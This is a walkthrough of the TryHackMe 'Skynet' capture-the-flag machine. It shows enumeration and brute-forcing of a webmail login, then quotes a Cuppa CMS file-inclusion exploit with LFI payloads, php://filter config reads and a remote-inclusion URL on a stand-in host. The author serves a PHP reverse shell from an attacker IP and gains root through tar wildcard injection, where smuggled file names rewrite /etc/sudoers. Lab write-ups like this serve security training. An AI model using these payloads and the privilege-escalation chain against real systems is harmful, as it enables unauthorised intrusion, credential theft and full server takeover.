
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-1.png)

```text
# Nmap 7.80 scan initiated Sun Nov 22 05:54:38 2020 as: nmap -sS -T4 -oN nmap1.txt 10.10.150.216
Nmap scan report for 10.10.150.216
Host is up (0.069s latency).
Not shown: 994 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds

# Nmap done at Sun Nov 22 05:54:41 2020 -- 1 IP address (1 host up) scanned in 3.37 seconds
```
The more detailed scan.
```text
# Nmap 7.80 scan initiated Sun Nov 22 05:55:05 2020 as: nmap -sV -sC -p22,80,110,139,143,445 -oN nmap2.txt 10.10.150.216
Nmap scan report for 10.10.150.216
Host is up (0.062s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING CAPA RESP-CODES SASL UIDL AUTH-RESP-CODE TOP
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: listed SASL-IR IDLE IMAP4rev1 LOGINDISABLEDA0001 capabilities post-login ENABLE have more Pre-login ID LOGIN-REFERRALS OK LITERAL+
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h59m36s, deviation: 3h27m50s, median: -23s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2020-11-22T04:54:57-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-22T10:54:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Nov 22 05:55:23 2020 -- 1 IP address (1 host up) scanned in 18.13 seconds

```



Http service on port 80 reveals a page with a search which does nothing.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-2.png)

In that case, i decided to find some hidden directories using ffuf.
```text

./ffuf -u http://10.10.150.216/FUZZ -w /usr/share/wordlists/dirb/common.txt -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.150.216/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

                        [Status: 200, Size: 523, Words: 26, Lines: 19]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
admin                   [Status: 301, Size: 314, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
config                  [Status: 301, Size: 315, Words: 20, Lines: 10]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 523, Words: 26, Lines: 19]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10]
squirrelmail            [Status: 301, Size: 321, Words: 20, Lines: 10]
:: Progress: [4615/4615] :: Job [1/1] :: 384 req/sec :: Duration: [0:00:12] :: Errors: 0 ::
```

The /squirrelmail has a login form.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-3.png)  
I didn't knew any username or password, but i had plenty of services to enumerate. The smb share has a folder which can be read by anyone.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-4.png)

![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-5.png)

The anonymous folder has a file which may be useful.

```text
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```

In the /logs folder, the log1.txt contains a list of passwords.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-6.png)  
I captured a request using burp suite and used it's intruder to try every password from the list found.  
```text
POST /squirrelmail/src/redirect.php HTTP/1.1

Host: 10.10.150.216
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 82
Origin: http://10.10.150.216
Connection: close
Referer: http://10.10.150.216/squirrelmail/src/login.php
Cookie: squirrelmail_language=en_US
Upgrade-Insecure-Requests: 1


login_username=milesdyson&secretkey=§pass§
```
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-7.png)  
Once logged in, i found 3 emails.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-8.png)  
The first of them has a password which can be used to login to the smb share.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-9.png)  
In his share, i found a file called important.txt
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-10.png)
```text

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```
The website at the specified location has this page. It wasn't that useful, but i managed to find some useful directories using ffuf.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-11.png)
```text
./ffuf -u http://10.10.150.216/45kra24zxs28v3yd/FUZZ -w /usr/share/wordlists/dirb/common.txt -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.150.216/45kra24zxs28v3yd/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

                        [Status: 200, Size: 418, Words: 45, Lines: 16]
administrator           [Status: 301, Size: 339, Words: 20, Lines: 10]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 418, Words: 45, Lines: 16]
:: Progress: [4615/4615] :: Job [1/1] :: 307 req/sec :: Duration: [0:00:15] :: Errors: 0 ::
```  
/administrator reveals cuppa CMS  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-12.png)

I tried the found credentials, but no luck. I looked for an exploit for this cms and i found it.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-13.png)

```text
# Exploit Title   : Cuppa CMS File Inclusion
# Date            : 4 June 2013
# Exploit Author  : CWH Underground
# Site            : www.2600.in.th
# Vendor Homepage : http://www.cuppacms.com/
# Software Link   : http://jaist.dl.sourceforge.net/project/cuppacms/cuppa_cms.zip
# Version         : Beta
# Tested on       : Window and Linux

  ,--^----------,--------,-----,-------^--,
  | |||||||||   `--------'     |          O .. CWH Underground Hacking Team ..
  `+---------------------------^----------|
    `\_,-------, _________________________|
      / XXXXXX /`|     /
     / XXXXXX /  `\   /
    / XXXXXX /\______(
   / XXXXXX /          
  / XXXXXX /
 (________(            
  `------'

####################################
VULNERABILITY: PHP CODE INJECTION
####################################

/alerts/alertConfigField.php (LINE: 22)

-----------------------------------------------------------------------------
LINE 22: 
        <?php include($_REQUEST["urlConfig"]); ?>
-----------------------------------------------------------------------------
    

#####################################################
DESCRIPTION
#####################################################

An attacker might include local or remote PHP files or read non-PHP files with this vulnerability. User tainted data is used when creating the file name that will be included into the current file. PHP code in this file will be evaluated, non-PHP code will be embedded to the output. This vulnerability can lead to full server compromise.

http://target/cuppa/alerts/alertConfigField.php?urlConfig=[FI]

#####################################################
EXPLOIT
#####################################################

http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?
http://target/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

Moreover, We could access Configuration.php source code via PHPStream 

For Example:
-----------------------------------------------------------------------------
http://target/cuppa/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
-----------------------------------------------------------------------------

Base64 Encode Output:
-----------------------------------------------------------------------------
PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gIkRiQGRtaW4iOwoJCXB1YmxpYyAkdGFibGVfcHJlZml4ID0gImN1XyI7CgkJcHVibGljICRhZG1pbmlzdHJhdG9yX3RlbXBsYXRlID0gImRlZmF1bHQiOwoJCXB1YmxpYyAkbGlzdF9saW1pdCA9IDI1OwoJCXB1YmxpYyAkdG9rZW4gPSAiT0JxSVBxbEZXZjNYIjsKCQlwdWJsaWMgJGFsbG93ZWRfZXh0ZW5zaW9ucyA9ICIqLmJtcDsgKi5jc3Y7ICouZG9jOyAqLmdpZjsgKi5pY287ICouanBnOyAqLmpwZWc7ICoub2RnOyAqLm9kcDsgKi5vZHM7ICoub2R0OyAqLnBkZjsgKi5wbmc7ICoucHB0OyAqLnN3ZjsgKi50eHQ7ICoueGNmOyAqLnhsczsgKi5kb2N4OyAqLnhsc3giOwoJCXB1YmxpYyAkdXBsb2FkX2RlZmF1bHRfcGF0aCA9ICJtZWRpYS91cGxvYWRzRmlsZXMiOwoJCXB1YmxpYyAkbWF4aW11bV9maWxlX3NpemUgPSAiNTI0Mjg4MCI7CgkJcHVibGljICRzZWN1cmVfbG9naW4gPSAwOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3ZhbHVlID0gIiI7CgkJcHVibGljICRzZWN1cmVfbG9naW5fcmVkaXJlY3QgPSAiIjsKCX0gCj8+
-----------------------------------------------------------------------------

Base64 Decode Output:
-----------------------------------------------------------------------------
<?php 
	class Configuration{
		public $host = "localhost";
		public $db = "cuppa";
		public $user = "root";
		public $password = "Db@dmin";
		public $table_prefix = "cu_";
		public $administrator_template = "default";
		public $list_limit = 25;
		public $token = "OBqIPqlFWf3X";
		public $allowed_extensions = "*.bmp; *.csv; *.doc; *.gif; *.ico; *.jpg; *.jpeg; *.odg; *.odp; *.ods; *.odt; *.pdf; *.png; *.ppt; *.swf; *.txt; *.xcf; *.xls; *.docx; *.xlsx";
		public $upload_default_path = "media/uploadsFiles";
		public $maximum_file_size = "5242880";
		public $secure_login = 0;
		public $secure_login_value = "";
		public $secure_login_redirect = "";
	} 
?>
-----------------------------------------------------------------------------

Able to read sensitive information via File Inclusion (PHP Stream)

################################################################################################################
 Greetz      : ZeQ3uL, JabAv0C, p3lo, Sh0ck, BAD $ectors, Snapter, Conan, Win7dos, Gdiupo, GnuKDE, JK, Retool2 
################################################################################################################
```

I copied the exploit to my folder and read it carefully. Turns out, this cms is vulnerable to LFI and RFI.
```text
cp /usr/share/exploitdb/exploits/php/webapps/25971.txt .
```
I requested the contents of /etc/passwd using the payload below, and i got them.
```text
http://10.10.150.216/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```
Because, it is also vulnerable to RFI, i can upload a reverse shell.
```text
1. python3 -m http.server 4444
2. Go to http://10.10.150.216/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.8.5.181:4444
```
The second GET will appear as i acces the rev.php file  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-14.png)  

Also, the page will list all the files i have in the current directory.  
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-15.png)  
As i had a reverse shell, i looked into ways to advance in privileges.
![alt_text](https://github.com/Alex-Stinga/TryHackMe/blob/master/ctf_like/Skynet/images/134-16.png)

In the crontab file i noticed the backup.sh script.

```text
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

```

The code of this script is:
```text
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
Using the wildcard alonside tar i can became root. 

```text
www-data@skynet:/var/www/html$ echo 'echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
www-data@skynet:/var/www/html$ echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
www-data@skynet:/var/www/html$ echo "/var/www/html"  > --checkpoint=1

www-data@skynet:/var/www/html$ sudo -l
sudo -l
User www-data may run the following commands on skynet:
    (root) NOPASSWD: ALL
```
